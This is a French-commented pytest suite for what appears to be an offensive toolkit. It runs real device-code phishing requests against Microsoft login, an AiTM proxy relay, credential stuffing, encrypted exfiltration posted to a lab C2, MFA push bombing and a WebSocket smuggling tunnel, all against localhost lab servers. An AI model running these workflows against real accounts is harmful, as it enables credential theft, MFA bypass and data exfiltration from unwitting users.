"""
test_real_mode.py — Suite de validation du MODE RÉEL (pas de simulation)
=========================================================================

Chaque test exerce un chemin 100% réel :

  1. Device Code OAuth réel   → POST https://login.microsoftonline.com
     (client public Azure CLI) + polling réel du token endpoint (RFC 8628).
  2. Proxy AiTM réel          → serveur uvicorn local + requêtes relayées
     réellement (GET/POST avec corps).
  3. Credential stuffing réel → serveur C2 de labo (c2/lab_c2_server.py)
     + POST httpx réels + vérification des artefacts récep.
  4. Exfiltration réelle      → AES-256-GCM réel + POST HTTP réel au C2 +
     déchiffrement côté récepteur, SHA-256 comparé.
  5. MFA bombing réel         → POST HTTP réels au C2, décision allow à partir
     du N-ième push, stop-on-accept vérifié.

Réseau externes (Microsoft) : internet requis ; ils sont marqués réseau mais
tournent par défaut (labo autorisé). Aucun mock n'est utilisé dans ce fichier.
"""

from __future__ import annotations

import asyncio
import base64
import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from pathlib import Path

import httpx
import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

AZURE_PUBLIC_CLIENT = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Azure CLI
DEVICE_CODE_URL = ("https://login.microsoftonline.com/consumers"
                   "/oauth2/v2.0/devicecode")
TOKEN_URL = ("https://login.microsoftonline.com/consumers"
             "/oauth2/v2.0/token")


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


# ---------------------------------------------------------------------------
# Fixtures serveurs locaux RÉELS
# ---------------------------------------------------------------------------

@pytest.fixture(scope="session")
def lab_c2_port():
    """Démarre le serveur C2 de labo (vrai HTTP) et retourne son port."""
    port = _free_port()
    env = dict(os.environ,
               LABC2_PORT=str(port),
               LABC2_ACCEPT_USERS="alice@corp.local,bob@corp.local",
               LABC2_LOCK_USERS="locked@corp.local",
               LABC2_ACCEPT_AFTER_N="3")
    proc = subprocess.Popen(
        [sys.executable, "c2/lab_c2_server.py", str(port)],
        env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )
    base = f"http://127.0.0.1:{port}"
    for _ in range(50):
        try:
            if urllib.request.urlopen(f"{base}/health", timeout=1).status == 200:
                break
        except Exception:  # noqa: BLE001 — pas encore prête
            time.sleep(0.1)
    else:
        proc.terminate()
        pytest.fail("lab_c2_server n'a pas démarré")
    yield port
    proc.terminate()
    proc.wait(timeout=5)


@pytest.fixture(scope="session")
def aitm_url():
    """Démarre le vrai reverse proxy AiTM (uvicorn, thread) pointant vers httpbin."""
    from engine import advanced_proxy
    from engine.advanced_proxy import app, _proxy_config  # import réel du module

    import uvicorn

    # Cible réelle du reverse proxy (comme en opération, via config)
    _proxy_config["REVERSE_PROXY_TARGET"] = "https://httpbin.org"
    assert advanced_proxy._proxy_config["REVERSE_PROXY_TARGET"] == "https://httpbin.org"

    port = _free_port()
    config = uvicorn.Config(app, host="127.0.0.1", port=port,
                            log_level="error")
    server = uvicorn.Server(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    for _ in range(50):
        if server.started:
            break
        time.sleep(0.1)
    yield f"http://127.0.0.1:{port}"
    server.should_exit = True
    thread.join(timeout=5)


# ---------------------------------------------------------------------------
# 1) Device Code OAuth réel (initiate + poll) — Microsoft Entra
# ---------------------------------------------------------------------------

@pytest.mark.network
def test_real_device_code_initiate_and_poll():
    from attack.device_code.initiator import DeviceCodeInitiator
    from attack.device_code.poller import DeviceCodePoller

    flow = DeviceCodeInitiator().initiate_real(
        scope="openid profile offline_access",
        client_id=AZURE_PUBLIC_CLIENT,
    )
    assert flow.user_code and len(flow.user_code) >= 6
    assert flow.verification_uri.startswith("https://")
    assert flow.expires_in >= 300
    # Polling réel (pas de navigateur ouvert → authorization_pending attendu,
    # conforme RFC 8628 ; le flow ne doit JAMAIS passer authorized sans la
    # victime, et aucun token ne doit apparaître)
    poller = DeviceCodePoller(flow)
    result = asyncio.run(poller.poll_real(max_wait_s=3))
    assert result.state != "authorized"
    assert result.result is None
    assert result.user_code == flow.user_code


# ---------------------------------------------------------------------------
# 2) Proxy AiTM réel : relay GET/POST
# ---------------------------------------------------------------------------

@pytest.mark.network
def test_real_aitm_proxy_relays(aitm_url):
    r1 = httpx.get(f"{aitm_url}/get", timeout=30)
    assert r1.status_code == 200
    assert "origin" in r1.json()          # httpbin réel derrière le proxy
    payload = {"phished": True, "via": "aitm", "n": 42}
    r2 = httpx.post(f"{aitm_url}/post", json=payload, timeout=30)
    assert r2.status_code == 200
    assert r2.json()["json"] == payload   # corps réellement relayé


# ---------------------------------------------------------------------------
# 3) Credential stuffing réel : POST httpx + vérification réception C2
# ---------------------------------------------------------------------------

def test_real_credential_stuffing(lab_c2_port):
    from attack.credential_stuffing.sprayer import (CredentialPair,
                                                    CredentialStuffingEngine,
                                                    RealLoginTarget)

    target = RealLoginTarget(
        url=f"http://127.0.0.1:{lab_c2_port}/ingest",
        method="json",
        user_field="user",
        password_field="password",
    )
    engine = CredentialStuffingEngine(real=True, real_login_target=target,
                                      proxy_pool=None)
    creds = [
        CredentialPair(username="alice@corp.local", password="Spring2026!"),
        CredentialPair(username="bob@corp.local", password="Winter2025!"),
        CredentialPair(username="mallory@corp.local", password="WrongPass1!"),
        CredentialPair(username="locked@corp.local", password="Whatever1!"),
    ]
    report = engine.run_credential_stuffing(creds, simulated=True)
    assert report.total_attempts == 4
    assert report.successful_logins == 2, "2 users réellement acceptés par le C2"
    assert report.locked_accounts == 1, "1 compte réellement verrouillé (423)"
    assert report.failed_logins == 2  # mallory (401) + locked (423)
    hits = report.hits
    assert {h["user"] for h in hits} == {"alice@corp.local", "bob@corp.local"}
    assert all(h["real"] is True for h in hits)
    # Preuve côté serveur : les requêtes sont bien arrivées
    c2_log = Path("captures/lab_c2/stuffing.jsonl")
    assert c2_log.is_file(), "le C2 n'a rien reçu (pas réel)"
    lines = [json.loads(l) for l in c2_log.read_text().splitlines()]
    assert len(lines) >= 4
    assert any(l["verdict"] == "success" for l in lines)
    assert any(l["verdict"] == "locked" for l in lines)
    # Rapport persisté avec les hits réels
    rp = Path(engine.output_dir) / f"{report.campaign_id}_report.json"
    assert rp.is_file() and report.campaign_id in rp.read_text()


# ---------------------------------------------------------------------------
# 4) Exfiltration réelle : AES-GCM + POST + déchiffrement côté récepteur
# ---------------------------------------------------------------------------

def test_real_exfiltration(lab_c2_port):
    from attack.post_exploitation.exfil import (DataExfiltrator, StagedFile,
                                                decrypt_exfil_blob,
                                                parse_exfil_sink)

    secret = (b"TOP SECRET LABO : Iban FR76 3000 6000 0112 3456 7890 189, "
              b"mot de passe: S3cr3t!2026\n").replace(b"\n", b"")
    src = Path("captures/lab_c2/secret_to_exfil.txt")
    src.write_bytes(secret)
    real_sha = __import__("hashlib").sha256(secret).hexdigest()

    staged = StagedFile(path=str(src), category="Lab", sensitivity_score=0.99)
    ex = DataExfiltrator(
        destination=f"http://127.0.0.1:{lab_c2_port}/exfil",
        output_path="captures/lab_c2/real_exfil.bin.enc",
    )
    # 1) Sink chiffré réel (AES-256-GCM, nonce+ct base64, chunks C{i})
    sink = ex.exfil_files([staged])
    assert sink["files"] == 1 and sink["bytes"] == len(secret)
    # 2) POST HTTP réel de tous les blobs vers le C2
    n_sent = ex.send_real()
    assert n_sent == 1
    # 3) Vérif JSONL sink local : cohérence
    parsed = parse_exfil_sink("captures/lab_c2/real_exfil.bin.enc")
    assert len(parsed) == 1
    # 4) Côté récepteur : déchiffrement réel avec la clé de session
    recv = Path(f"captures/lab_c2/exfil_{ex.session_id}.jsonl")
    assert recv.is_file(), "le C2 n'a rien reçu (pas réel)"
    entry = json.loads(recv.read_text().splitlines()[-1])
    assert entry["sha256"] == real_sha
    cleartext = decrypt_exfil_blob(
        session_key_b64=ex.session_key_b64,
        nonce_b64=entry["nonce_b64"], ct_b64=entry["ct_b64"],
    )
    assert cleartext == secret, "déchiffrement réel ≠ contenu original"


# ---------------------------------------------------------------------------
# 5) MFA bombing réel : POST HTTP, décision serveur, stop-on-accept
# ---------------------------------------------------------------------------

def test_real_mfa_bombing(lab_c2_port):
    from attack.mfa_bombing.bomber import MFABombingEngine, MFATarget

    engine = MFABombingEngine(output_dir="captures/mfa_bombing_real")
    campaign = engine.start_campaign(
        target=MFATarget.MICROSOFT_ENTRA,
        username="victim@corp.local",
        interval_seconds=0.05,
        max_attempts=25,
        push_url=f"http://127.0.0.1:{lab_c2_port}/push",
        real=True,
    )
    for _ in range(200):
        if campaign.accepted_attempt is not None:
            break
        time.sleep(0.05)
    campaign.stop_event.set()
    time.sleep(0.2)
    assert campaign.accepted_attempt is not None, "aucun push réel accepté"
    assert campaign.accepted_attempt.success is True
    assert (campaign.accepted_attempt.response_code or 0) == 200
    n_before = campaign.accepted_attempt.push_n
    time.sleep(0.3)
    assert campaign.total_attempts <= n_before + 2, "bombing non stoppé après accept"
    log = Path("captures/lab_c2/mfa_pushes.jsonl")
    assert log.is_file(), "le C2 n'a reçu aucun push (pas réel)"
    pushes = [json.loads(l) for l in log.read_text().splitlines()]
    assert any(p["decision"] == "allow" for p in pushes)
    assert any(p["body"].get("user") == "victim@corp.local" for p in pushes)


# ---------------------------------------------------------------------------
# 6) Tunnel WebSocket réel : echo complet (send + receive)
# ---------------------------------------------------------------------------

def _start_ws_echo(port: int) -> subprocess.Popen:
    server_code = f"""
import asyncio, websockets

async def handler(ws):
    async for message in ws:
        await ws.send(message)

async def main():
    async with websockets.serve(handler, "127.0.0.1", {port}):
        await asyncio.Future()

asyncio.run(main())
"""
    return subprocess.Popen([sys.executable, "-c", server_code],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def test_real_ws_tunnel_roundtrip():
    from attack.ws_smuggling.smuggler import WSSmugglingTunnel

    port = _free_port()
    proc = _start_ws_echo(port)
    try:
        # Attente réelle de la readiness du serveur echo (socket TCP)
        for _ in range(50):
            try:
                with socket.create_connection(("127.0.0.1", port), timeout=0.5):
                    pass
                break
            except OSError:
                time.sleep(0.1)
        else:
            pytest.fail("serveur echo WS jamais prêt")
        tun = WSSmugglingTunnel()
        cfg = tun.create_tunnel(ws_url=f"ws://127.0.0.1:{port}/ws",
                                subprotocol="graphql-ws")
        secret = b"IMPLANT >> commande op, beacon 127.0.0.1, credentials en piece jointe"
        res = asyncio.run(tun.roundtrip_real(cfg.tunnel_id, secret, timeout_s=5))
        assert res["sent"] is True
        assert res["size"] == len(secret)
        assert res["data"] == secret, "écho WS réel ≠ payload envoyé"
        assert tun.tunnels[cfg.tunnel_id].bytes_received > 0
        assert Path("captures/ws_tunnels/ws_traffic.jsonl").is_file()
    finally:
        proc.terminate()
        proc.wait(timeout=5)
